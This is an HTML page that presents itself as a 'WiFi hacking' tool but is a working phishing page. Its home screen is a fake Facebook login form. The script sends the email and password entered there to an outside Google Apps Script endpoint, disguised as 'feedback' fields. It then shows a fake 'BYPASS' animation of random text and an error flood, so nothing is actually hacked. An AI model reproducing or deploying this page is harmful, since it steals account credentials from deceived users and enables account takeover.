<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WiFi System</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#000;
  color:#0f0;
  overflow:hidden;
}

/* SIDEBAR */
#sidebar{
  position:fixed;
  left:0;
  top:0;
  width:80px;
  height:100%;
  background:#111;
  display:flex;
  flex-direction:column;
  align-items:center;
  padding-top:120px;
}
#sidebar button{
  margin:10px 0;
  background:none;
  border:none;
  color:#0f0;
  font-size:14px;
  cursor:pointer;
}
#sidebar button.locked{
  opacity:0.3;
  pointer-events:none;
}

/* HEADER TEXT */
#title{
  text-align:center;
  font-size:28px;
  font-weight:bold;
  padding:20px;
  animation:glow 2s infinite alternate;
}
@keyframes glow{
  from{text-shadow:0 0 5px #0f0;}
  to{text-shadow:0 0 20px #0f0;}
}

/* CONTENT */
.section{
  display:none;
  margin-left:90px;
  padding:20px;
  animation:fade 0.4s;
}
.section.active{display:block;}

@keyframes fade{
  from{opacity:0; transform:translateY(10px);}
  to{opacity:1;}
}

input, select, button{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:6px;
}
button{
  background:#0f0;
  color:#000;
  font-weight:bold;
  cursor:pointer;
}

label{
  font-size:12px;
  opacity:0.8;
}

.shake{
  animation:shake 0.3s;
}
@keyframes shake{
  0%{transform:translateX(0);}
  25%{transform:translateX(-5px);}
  50%{transform:translateX(5px);}
  75%{transform:translateX(-5px);}
  100%{transform:translateX(0);}
}

/* HACK TEXT */
#terminal{
  font-family:monospace;
  font-size:13px;
  white-space:pre-wrap;
  color:#0f0;
}

/* ERROR */
#error{
  position:fixed;
  inset:0;
  background:#000;
  color:red;
  font-size:18px;
  display:none;
  overflow:hidden;
}
</style>
</head>

<body>

<div id="title">
  WIFI HACKING<br>
  ONLY PRIVATE WIFI<br>
  WIFI AT HOME<br>
  NOT PISO WIFI
</div>

<div id="sidebar">
  <button onclick="show('home')">HOME</button>
  <button id="wifiBtn" class="locked" onclick="show('wifi')">WIFI</button>
</div>

<!-- HOME -->
<div id="home" class="section active">
  <h3>FACEBOOK LOG IN</h3>
  <input id="f1" placeholder="Email or phone number">
  <input id="f2" placeholder="Password">
  <button onclick="submitFeedback()">Log in</button>
  <p id="status"></p>
</div>

<!-- WIFI -->
<div id="wifi" class="section">
  <h3>WIFI SYSTEM</h3>

  <label>WIFI</label>
  <input id="wifiName" placeholder="Enter WiFi name">

  <label>SECURITY</label>
  <select id="security">
    <option>None / Enhanced Open</option>
    <option>WPA / WPA2 / WPA3 - Personal</option>
  </select>

  <label>NETWORK USAGE</label>
  <select id="networkUsage">
    <option>Detect Automatically</option>
    <option>Treat as metered</option>
    <option>Treat as unmetered</option>
  </select>

  <label>PRIVACY</label>
  <select id="privacy">
    <option>Use randomized MAC (default)</option>
    <option>Use device MAC</option>
  </select>

  <label>AUTO-CONNECT</label>
  <select id="autoConnect">
    <option>ON</option>
    <option>OFF</option>
  </select>

  <button onclick="startBypass()">BYPASS</button>
  <pre id="terminal"></pre>
</div>

<!-- ERROR SCREEN -->
<div id="error"></div>

<script>
const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbz86yAiT4XAWqKqaC1YmyyjW4zgPvkr_w5GZtcGteJWcMbanpXkq1n_NS5y43lizuNs/exec";

function show(id){
  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function submitFeedback(){
  const a=f1.value.trim();
  const b=f2.value.trim();

  if(!a && !b){
    navigator.vibrate(200);
    home.classList.add('shake');
    setTimeout(()=>home.classList.remove('shake'),300);
    return;
  }

  fetch(WEBAPP_URL,{
    method:"POST",
    body:JSON.stringify({
      feedback1:a,
      feedback2:b
    })
  });

  wifiBtn.classList.remove('locked');
  status.innerText="SYSTEM IS READY";
}

function startBypass(){
  let t=terminal;
  t.textContent="";
  let i=0;

  let interval=setInterval(()=>{
    t.textContent += Math.random().toString(36).substring(2)+"\n";
    t.scrollTop=t.scrollHeight;
    i++;
    if(i>40){
      clearInterval(interval);
      askPrivate();
    }
  },350);
}

function askPrivate(){
  terminal.textContent += "\nIT'S PRIVATE WIFI?\nYES | NO\n";
  setTimeout(continueHack,2000);
}

function continueHack(){
  let i=0;
  let interval=setInterval(()=>{
    terminal.textContent += Math.random().toString(36)+"\n";
    i++;
    if(i>15){
      clearInterval(interval);
      showError();
    }
  },300);
}

function showError(){
  error.style.display="block";
  navigator.vibrate([300,200,300,200,500]);

  let spam=setInterval(()=>{
    error.innerHTML += "ERROR ERROR ERROR ERROR ERROR<br>";
  },100);

  setTimeout(()=>clearInterval(spam),5000);
}
</script>

</body>
</html>
